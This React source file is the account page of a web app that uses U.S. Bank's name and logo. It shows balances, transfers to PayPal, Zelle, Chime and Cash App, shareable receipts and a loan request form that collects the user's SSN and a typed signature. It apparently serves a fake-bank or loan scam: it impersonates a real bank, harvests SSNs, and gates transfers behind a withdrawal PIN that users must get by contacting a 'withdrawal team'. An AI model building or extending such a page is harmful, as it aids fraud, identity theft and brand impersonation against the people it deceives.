import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useCallback, useEffect, useMemo, useState } from "react";
import { useQueryClient } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { logoDataUri, LOGO_WIDTH, LOGO_HEIGHT } from "@/assets/logo";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Toaster } from "@/components/ui/sonner";
import { toast } from "sonner";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { currency, MIN_TRANSFER_AMOUNT, MIN_TRANSFER_LABEL } from "@/lib/banks";
import {
  LoanAlertOptIn,
  useLoanApprovalAlerts,
} from "@/components/LoanApprovalAlert";
import {
  categoryLabel,
  shareReceipt,
} from "@/lib/receipt";
import { LinkedAccountDialog, ZelleDialog } from "@/components/SendDialogs";
import {
  PinField,
  validPin,
  ContactWithdrawalTeam,
} from "@/components/WithdrawalPin";
import { ContactSupport } from "@/components/ContactSupport";
import {
  ArrowLeftRight,
  Building2,
  CheckCircle2,
  Clock,
  DollarSign,
  LogOut,
  Send,
  Share2,
  Smartphone,
  Wallet,
  XCircle,
} from "lucide-react";

export const Route = createFileRoute("/_authenticated/account")({
  component: AccountPage,
});

type Account = {
  id: string;
  name: string;
  kind: string;
  is_primary: boolean;
  account_number: string;
  balance: number;
};

type Txn = {
  id: string;
  description: string;
  amount: number;
  direction: string;
  status: string;
  category: string;
  created_at: string;
};

type Loan = {
  id: string;
  amount: number;
  apr: number;
  term_months: number;
  status: "pending" | "approved" | "declined";
  created_at: string;
  disbursed_at: string | null;
};

type Profile = {
  first_name: string;
  last_name: string;
  email: string;
  cell_phone: string;
  street: string;
  city: string;
  state: string;
  zip: string;
};

type ActionKind =
  | "internal"
  | "zelle"
  | "external"
  | "paypal"
  | "chime"
  | "cashapp"
  | null;

function AccountPage() {
  const navigate = useNavigate();
  const queryClient = useQueryClient();
  const [accounts, setAccounts] = useState<Account[]>([]);
  const [txns, setTxns] = useState<Txn[]>([]);
  const [loans, setLoans] = useState<Loan[]>([]);
  const [name, setName] = useState("");
  const [loading, setLoading] = useState(true);
  const [action, setAction] = useState<ActionKind>(null);
  const [receipt, setReceipt] = useState<Txn | null>(null);
  const [loanDetail, setLoanDetail] = useState<Loan | null>(null);
  const [requestLoan, setRequestLoan] = useState(false);
  const [profile, setProfile] = useState<Profile | null>(null);

  const load = useCallback(async () => {
    const [a, t, l, p] = await Promise.all([
      supabase.from("accounts").select("*").order("is_primary", { ascending: false }),
      supabase
        .from("transactions")
        .select("*")
        .order("created_at", { ascending: false })
        .limit(50),
      supabase
        .from("loan_applications")
        .select("id, amount, apr, term_months, status, created_at, disbursed_at")
        .order("created_at", { ascending: false }),
      supabase
        .from("profiles")
        .select(
          "first_name, last_name, email, cell_phone, street, city, state, zip",
        )
        .maybeSingle(),
    ]);
    setAccounts((a.data as Account[]) ?? []);
    setTxns((t.data as Txn[]) ?? []);
    setLoans((l.data as Loan[]) ?? []);
    setName(p.data?.first_name ?? "");
    setProfile((p.data as Profile) ?? null);
    setLoading(false);
  }, []);

  useEffect(() => {
    load();
  }, [load]);

  useEffect(() => {
    const channel = supabase
      .channel("account-live")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "accounts" },
        () => load(),
      )
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "transactions" },
        () => load(),
      )
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "loan_applications" },
        () => load(),
      )
      .subscribe();
    return () => {
      supabase.removeChannel(channel);
    };
  }, [load]);

  const primary = useMemo(
    () => accounts.find((a) => a.is_primary) ?? accounts[0],
    [accounts],
  );

  useLoanApprovalAlerts(loans);

  async function signOut() {
    await queryClient.cancelQueries();
    queryClient.clear();
    await supabase.auth.signOut();
    navigate({ to: "/auth", replace: true });
  }

  return (
    <div className="min-h-screen bg-surface">
      <Toaster />
      <header className="sticky top-0 z-40 border-b bg-card/95 backdrop-blur">
        <div className="mx-auto flex max-w-5xl items-center justify-between px-4 py-3">
          <Link to="/">
            <img
              src={logoDataUri}
              alt="U.S. Bank"
              width={LOGO_WIDTH}
              height={LOGO_HEIGHT}
              className="h-7 w-auto"
            />
          </Link>
          <Button variant="ghost" size="sm" onClick={signOut}>
            <LogOut className="mr-2 h-4 w-4" /> Sign out
          </Button>
        </div>
      </header>

      <main className="mx-auto max-w-5xl px-4 py-8">
        <h1 className="text-2xl font-bold text-foreground">
          Welcome back{name ? `, ${name}` : ""}
        </h1>
        <p className="mt-1 text-sm text-muted-foreground">
          Your accounts, disbursements and transfers in one place.
        </p>

        <LoanAlertOptIn />

        <section className="mt-6 grid gap-4 sm:grid-cols-2">
          {accounts.map((a) => (
            <div
              key={a.id}
              className="rounded-xl border bg-card p-5 shadow-[var(--shadow-card)]"
            >
              <p className="text-sm text-muted-foreground">{a.name}</p>
              <p className="text-xs text-muted-foreground">{a.account_number}</p>
              <p className="mt-3 text-3xl font-bold text-foreground">
                {currency(Number(a.balance))}
              </p>
            </div>
          ))}
          {!loading && accounts.length === 0 && (
            <p className="text-sm text-muted-foreground">No accounts yet.</p>
          )}
        </section>

        <section className="mt-6 grid gap-3 sm:grid-cols-3">
          <ActionTile
            icon={<ArrowLeftRight className="h-6 w-6 text-accent" />}
            title="Transfer"
            text="Between your accounts"
            onClick={() => setAction("internal")}
          />
          <ActionTile
            icon={<Send className="h-6 w-6 text-accent" />}
            title="Zelle"
            text="Send to a person"
            onClick={() => setAction("zelle")}
          />
          <ActionTile
            icon={<Building2 className="h-6 w-6 text-accent" />}
            title="Send to other banks"
            text="Send to any U.S. bank"
            onClick={() => setAction("external")}
          />
          <ActionTile
            icon={<Wallet className="h-6 w-6 text-accent" />}
            title="PayPal"
            text="Send to a PayPal account"
            onClick={() => setAction("paypal")}
          />
          <ActionTile
            icon={<Smartphone className="h-6 w-6 text-accent" />}
            title="Chime"
            text="Link a Chime account"
            onClick={() => setAction("chime")}
          />
          <ActionTile
            icon={<DollarSign className="h-6 w-6 text-accent" />}
            title="Cash App"
            text="Link a Cash App account"
            onClick={() => setAction("cashapp")}
          />
        </section>

        <section className="mt-8 rounded-xl border bg-card shadow-[var(--shadow-card)]">
          <div className="flex items-center justify-between gap-3 border-b px-5 py-4">
            <h2 className="text-lg font-semibold text-foreground">
              Disbursements
            </h2>
            <Button size="sm" onClick={() => setRequestLoan(true)}>
              <DollarSign className="mr-1.5 h-4 w-4" /> Request a loan
            </Button>
          </div>
          <div className="divide-y">
            {loans.map((l) => (
              <button
                type="button"
                key={l.id}
                onClick={() => setLoanDetail(l)}
                className="flex w-full items-center justify-between px-5 py-4 text-left transition-colors hover:bg-accent/5"
              >
                <div>
                  <p className="font-medium text-foreground">
                    Personal loan {currency(Number(l.amount))}
                  </p>
                  <p className="text-xs text-muted-foreground">
                    {Number(l.apr)}% APR · {l.term_months} months · submitted{" "}
                    {new Date(l.created_at).toLocaleDateString()} · Track request
                  </p>
                </div>
                <StatusBadge status={l.status} />
              </button>
            ))}
            {loans.length === 0 && (
              <p className="px-5 py-6 text-sm text-muted-foreground">
                No loan applications yet.
              </p>
            )}
          </div>
        </section>

        <section className="mt-6 rounded-xl border bg-card shadow-[var(--shadow-card)]">
          <h2 className="border-b px-5 py-4 text-lg font-semibold text-foreground">
            Account Activity
          </h2>
          <div className="divide-y">
            {txns.map((t) => (
              <button
                type="button"
                key={t.id}
                onClick={() => setReceipt(t)}
                className="flex w-full items-center justify-between px-5 py-4 text-left transition-colors hover:bg-accent/5"
              >
                <div>
                  <p className="font-medium text-foreground">{t.description}</p>
                  <p className="text-xs text-muted-foreground">
                    {new Date(t.created_at).toLocaleString()} · {t.status} · View receipt
                  </p>
                </div>
                <p
                  className={
                    t.direction === "credit"
                      ? "font-semibold text-accent"
                      : "font-semibold text-foreground"
                  }
                >
                  {t.direction === "credit" ? "+" : "−"}
                  {currency(Number(t.amount))}
                </p>
              </button>
            ))}
            {txns.length === 0 && (
              <p className="px-5 py-6 text-sm text-muted-foreground">
                No activity yet. Approved loan disbursements appear here instantly.
              </p>
            )}
          </div>
        </section>

        <section className="mt-8 rounded-xl border bg-card p-5 shadow-[var(--shadow-card)]">
          <h2 className="mb-4 text-lg font-semibold text-foreground">
            Contact Support
          </h2>
          <ContactSupport />
        </section>
      </main>

      <LoanTrackerDialog
        loan={loanDetail}
        onClose={() => setLoanDetail(null)}
      />

      <RequestLoanDialog
        open={requestLoan}
        profile={profile}
        onClose={() => setRequestLoan(false)}
        onDone={load}
      />

      <MoneyDialog
        action={action}
        accounts={accounts}
        primaryId={primary?.id}
        onClose={() => setAction(null)}
        onDone={load}
      />
      {action === "zelle" && (
        <ZelleDialog
          accounts={accounts}
          primaryId={primary?.id}
          onClose={() => setAction(null)}
          onDone={load}
        />
      )}
      {(action === "chime" || action === "cashapp" || action === "external") && (
        <LinkedAccountDialog
          kind={action}
          accounts={accounts}
          primaryId={primary?.id}
          onClose={() => setAction(null)}
          onDone={load}
        />
      )}
      <ReceiptDialog txn={receipt} onClose={() => setReceipt(null)} />
    </div>
  );
}



function ReceiptDialog({
  txn,
  onClose,
}: {
  txn: Txn | null;
  onClose: () => void;
}) {
  const [busy, setBusy] = useState(false);
  if (!txn) return null;

  const rows: [string, string][] = [
    ["Description", txn.description],
    ["Type", txn.direction === "credit" ? "Credit" : "Debit"],
    ["Category", categoryLabel(txn.category)],
    ["Status", txn.status],
    ["Date", new Date(txn.created_at).toLocaleString()],
    ["Reference", txn.id.slice(0, 18).toUpperCase()],
  ];

  async function share() {
    if (!txn) return;
    setBusy(true);
    try {
      const result = await shareReceipt(txn);
      if (result === "shared") toast.success("Receipt shared");
      else if (result === "downloaded") toast.success("Receipt saved as JPEG");
      else toast.info("Receipt opened — press and hold the image to save it");
    } catch {
      toast.error("Could not save receipt");
    } finally {
      setBusy(false);
    }
  }

  return (
    <Dialog open onOpenChange={(v) => !v && onClose()}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>Transaction receipt</DialogTitle>
          <DialogDescription>
            Save this receipt as a JPEG image to your phone gallery.
          </DialogDescription>
        </DialogHeader>

        <div className="rounded-xl border bg-surface p-5">
          <p className="text-3xl font-bold text-foreground">
            {txn.direction === "credit" ? "+" : "−"}
            {currency(Number(txn.amount))}
          </p>
          <dl className="mt-4 space-y-2 text-sm">
            {rows.map(([k, v]) => (
              <div key={k} className="flex justify-between gap-4">
                <dt className="text-muted-foreground">{k}</dt>
                <dd className="text-right font-medium text-foreground">{v}</dd>
              </div>
            ))}
          </dl>
        </div>

        <Button className="w-full" onClick={share} disabled={busy}>
          <Share2 className="mr-2 h-4 w-4" />
          {busy ? "Preparing…" : "Save receipt to gallery"}
        </Button>

      </DialogContent>
    </Dialog>
  );
}


function StatusBadge({ status }: { status: Loan["status"] }) {
  if (status === "approved")
    return (
      <span className="inline-flex items-center gap-1 rounded-full bg-accent/10 px-3 py-1 text-xs font-medium text-accent">
        <CheckCircle2 className="h-3.5 w-3.5" /> Approved & disbursed
      </span>
    );
  if (status === "declined")
    return (
      <span className="inline-flex items-center gap-1 rounded-full bg-destructive/10 px-3 py-1 text-xs font-medium text-destructive">
        <XCircle className="h-3.5 w-3.5" /> Declined
      </span>
    );
  return (
    <span className="inline-flex items-center gap-1 rounded-full bg-muted px-3 py-1 text-xs font-medium text-muted-foreground">
      <Clock className="h-3.5 w-3.5" /> Under review
    </span>
  );
}

function RequestLoanDialog({
  open,
  profile,
  onClose,
  onDone,
}: {
  open: boolean;
  profile: Profile | null;
  onClose: () => void;
  onDone: () => void;
}) {
  const [amount, setAmount] = useState("25000");
  const [term, setTerm] = useState("60");
  const [purpose, setPurpose] = useState("");
  const [ssn, setSsn] = useState("");
  const [signature, setSignature] = useState("");
  const [busy, setBusy] = useState(false);
  const apr = 8.99;
  const amt = Number(amount);
  const valid =
    amt >= 1000 && ssn.trim().length >= 4 && signature.trim().length > 2;

  async function submit() {
    setBusy(true);
    const { data: auth } = await supabase.auth.getUser();
    const uid = auth.user?.id;
    if (!uid) {
      setBusy(false);
      toast.error("Please sign in again.");
      return;
    }
    const { error } = await supabase.from("loan_applications").insert({
      user_id: uid,
      amount: amt,
      apr,
      term_months: Number(term),
      first_name: profile?.first_name ?? "",
      last_name: profile?.last_name ?? "",
      ssn: ssn.trim(),
      cell_phone: profile?.cell_phone ?? "",
      email: profile?.email ?? "",
      street: profile?.street ?? "",
      city: profile?.city ?? "",
      state: profile?.state ?? "",
      zip: profile?.zip ?? "",
      loan_purpose: purpose,
      signature: signature.trim(),
    });
    setBusy(false);
    if (error) {
      toast.error(error.message);
      return;
    }
    toast.success("Loan request submitted — a loan officer is reviewing it.");
    setPurpose("");
    setSsn("");
    setSignature("");
    onClose();
    onDone();
  }

  const monthly =
    amt > 0
      ? (amt * (apr / 100 / 12)) /
        (1 - Math.pow(1 + apr / 100 / 12, -Number(term)))
      : 0;

  return (
    <Dialog open={open} onOpenChange={(o) => !o && onClose()}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>Request a loan</DialogTitle>
          <DialogDescription>
            Your details are already on file — confirm the amount and sign.
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-3">
          <div>
            <Label htmlFor="req-amount">Loan amount</Label>
            <Input
              id="req-amount"
              inputMode="numeric"
              value={amount}
              onChange={(e) => setAmount(e.target.value.replace(/[^\d]/g, ""))}
            />
          </div>
          <div>
            <Label htmlFor="req-term">Term</Label>
            <Select value={term} onValueChange={setTerm}>
              <SelectTrigger id="req-term">
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="24">24 months</SelectItem>
                <SelectItem value="36">36 months</SelectItem>
                <SelectItem value="48">48 months</SelectItem>
                <SelectItem value="60">60 months</SelectItem>
                <SelectItem value="84">84 months</SelectItem>
              </SelectContent>
            </Select>
          </div>
          <div>
            <Label htmlFor="req-purpose">Purpose</Label>
            <Input
              id="req-purpose"
              value={purpose}
              onChange={(e) => setPurpose(e.target.value)}
              placeholder="Debt consolidation, home project…"
            />
          </div>
          <div>
            <Label htmlFor="req-ssn">SSN</Label>
            <Input
              id="req-ssn"
              value={ssn}
              onChange={(e) => setSsn(e.target.value)}
              placeholder="•••-••-••••"
            />
          </div>
          <div>
            <Label htmlFor="req-sign">Electronic signature</Label>
            <Input
              id="req-sign"
              value={signature}
              onChange={(e) => setSignature(e.target.value)}
              placeholder="Type your full name"
            />
          </div>
          <p className="rounded-lg bg-muted/30 p-3 text-xs text-muted-foreground">
            {apr}% APR · estimated {currency(monthly || 0)}/month for {term}{" "}
            months. Approved funds are disbursed to your checking account.
          </p>
        </div>

        <Button disabled={!valid || busy} onClick={submit}>
          {busy ? "Submitting…" : "Submit loan request"}
        </Button>
      </DialogContent>
    </Dialog>
  );
}

function LoanTrackerDialog({
  loan,
  onClose,
}: {
  loan: Loan | null;
  onClose: () => void;
}) {
  if (!loan) return null;
  const submitted = new Date(loan.created_at);
  const decided = loan.disbursed_at ? new Date(loan.disbursed_at) : null;
  const steps = [
    {
      label: "Application submitted",
      note: submitted.toLocaleString(),
      done: true,
    },
    {
      label: "Under review by loan officer",
      note:
        loan.status === "pending"
          ? "In progress — you'll be notified the moment a decision is made."
          : "Completed",
      done: true,
      active: loan.status === "pending",
    },
    {
      label: loan.status === "declined" ? "Declined" : "Approved & disbursed",
      note:
        loan.status === "approved"
          ? `Funds sent to your checking account${decided ? ` on ${decided.toLocaleString()}` : ""}`
          : loan.status === "declined"
            ? "Contact support for details."
            : "Pending decision",
      done: loan.status !== "pending",
    },
  ];

  return (
    <Dialog open onOpenChange={(o) => !o && onClose()}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>Personal loan {currency(Number(loan.amount))}</DialogTitle>
          <DialogDescription>
            {Number(loan.apr)}% APR · {loan.term_months} months
          </DialogDescription>
        </DialogHeader>

        <div className="flex justify-center">
          <StatusBadge status={loan.status} />
        </div>

        <ol className="mt-4 space-y-4">
          {steps.map((s, i) => (
            <li key={i} className="flex gap-3">
              <div className="mt-0.5">
                {s.done ? (
                  s.active ? (
                    <Clock className="h-5 w-5 text-accent" />
                  ) : (
                    <CheckCircle2 className="h-5 w-5 text-accent" />
                  )
                ) : (
                  <Clock className="h-5 w-5 text-muted-foreground/50" />
                )}
              </div>
              <div>
                <p
                  className={
                    s.done
                      ? "text-sm font-medium text-foreground"
                      : "text-sm font-medium text-muted-foreground"
                  }
                >
                  {s.label}
                </p>
                <p className="text-xs text-muted-foreground">{s.note}</p>
              </div>
            </li>
          ))}
        </ol>

        <div className="mt-2 rounded-lg bg-muted/30 p-3 text-xs text-muted-foreground">
          Reference: {loan.id.slice(0, 8).toUpperCase()}
        </div>

        <Button variant="outline" onClick={onClose}>
          Close
        </Button>
      </DialogContent>
    </Dialog>
  );
}

function ActionTile({
  icon,
  title,
  text,
  onClick,
}: {
  icon: React.ReactNode;
  title: string;
  text: string;
  onClick: () => void;
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      className="rounded-xl border bg-card p-5 text-left shadow-[var(--shadow-card)] transition-colors hover:bg-accent/5"
    >
      {icon}
      <p className="mt-3 font-semibold text-foreground">{title}</p>
      <p className="text-sm text-muted-foreground">{text}</p>
    </button>
  );
}

function MoneyDialog({
  action,
  accounts,
  primaryId,
  onClose,
  onDone,
}: {
  action: ActionKind;
  accounts: Account[];
  primaryId?: string;
  onClose: () => void;
  onDone: () => void;
}) {
  const [from, setFrom] = useState("");
  const [to, setTo] = useState("");
  const [recipient, setRecipient] = useState("");
  const [recipientName, setRecipientName] = useState("");
  const [amount, setAmount] = useState("");
  const [busy, setBusy] = useState(false);
  const [pin, setPin] = useState("");

  useEffect(() => {
    if (action) {
      setFrom(primaryId ?? "");
      setTo("");
      setRecipient("");
      setRecipientName("");
      setAmount("");
      setPin("");
    }
  }, [action, primaryId]);

  const value = Number(amount);
  const validAmount = Number.isFinite(value) && value >= MIN_TRANSFER_AMOUNT;

  if (action !== "internal" && action !== "paypal") return null;

  const title =
    action === "internal"
      ? "Transfer between accounts"
      : "Send money to PayPal";

  async function submit(e: React.FormEvent) {
    e.preventDefault();
    if (!validAmount) {
      toast.error("Minimum transfer amount", {
        description: `Transfers must be at least ${MIN_TRANSFER_LABEL}.`,
      });
      return;
    }
    setBusy(true);
    let error = null as { message: string } | null;

    if (action === "internal") {
      ({ error } = await supabase.rpc("transfer_between_accounts", {
        _from: from,
        _to: to,
        _amount: value,
      }));
    } else {
      ({ error } = await supabase.rpc("send_money", {
        _from: from,
        _amount: value,
        _category: "paypal",
        _recipient: `${recipientName} (${recipient})`,
        _pin: pin,
      }));
    }

    setBusy(false);
    if (error) {
      toast.error("Transfer failed", { description: error.message });
      return;
    }
    toast.success("Transfer completed", {
      description: `${currency(value)} sent successfully.`,
    });
    onClose();
    onDone();
  }

  return (
    <Dialog open onOpenChange={(v) => !v && onClose()}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>{title}</DialogTitle>
          <DialogDescription>
            Funds move instantly from your selected account.
          </DialogDescription>
        </DialogHeader>
        <form className="space-y-4" onSubmit={submit}>
          <div className="space-y-2">
            <Label>From account</Label>
            <Select value={from} onValueChange={setFrom}>
              <SelectTrigger>
                <SelectValue placeholder="Select account" />
              </SelectTrigger>
              <SelectContent>
                {accounts.map((a) => (
                  <SelectItem key={a.id} value={a.id}>
                    {a.name} — {currency(Number(a.balance))}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          {action === "internal" && (
            <div className="space-y-2">
              <Label>To account</Label>
              <Select value={to} onValueChange={setTo}>
                <SelectTrigger>
                  <SelectValue placeholder="Select account" />
                </SelectTrigger>
                <SelectContent>
                  {accounts
                    .filter((a) => a.id !== from)
                    .map((a) => (
                      <SelectItem key={a.id} value={a.id}>
                        {a.name} — {currency(Number(a.balance))}
                      </SelectItem>
                    ))}
                </SelectContent>
              </Select>
            </div>
          )}

          {action === "paypal" && (
            <>
              <div className="space-y-2">
                <Label htmlFor="pp-name">Recipient name</Label>
                <Input
                  id="pp-name"
                  required
                  maxLength={100}
                  value={recipientName}
                  onChange={(e) => setRecipientName(e.target.value)}
                  placeholder="Jane Doe"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="pp-recipient">PayPal email or mobile</Label>
                <Input
                  id="pp-recipient"
                  required
                  maxLength={120}
                  value={recipient}
                  onChange={(e) => setRecipient(e.target.value)}
                  placeholder="name@paypal.com"
                />
              </div>
            </>
          )}

          <div className="space-y-2">
            <Label htmlFor="amount">Amount (USD)</Label>
            <Input
              id="amount"
              type="number"
              min={MIN_TRANSFER_AMOUNT}
              step="0.01"
              required
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
            />
            <p className="text-xs text-muted-foreground">
              Minimum transfer amount is {MIN_TRANSFER_LABEL}.
            </p>
          </div>

          {action === "internal" && <ContactWithdrawalTeam />}

          {action === "paypal" && (
            <>
              <PinField id="pp-pin" value={pin} onChange={setPin} />
              <ContactWithdrawalTeam />
            </>
          )}

          <Button
            type="submit"
            className="w-full"
            disabled={
              busy ||
              !from ||
              !validAmount ||
              (action === "internal" && !to) ||
              (action === "paypal" &&
                (!recipientName.trim() || !validPin(pin)))
            }
          >
            {busy ? "Sending…" : "Send money"}
          </Button>
        </form>
      </DialogContent>
    </Dialog>
  );
}
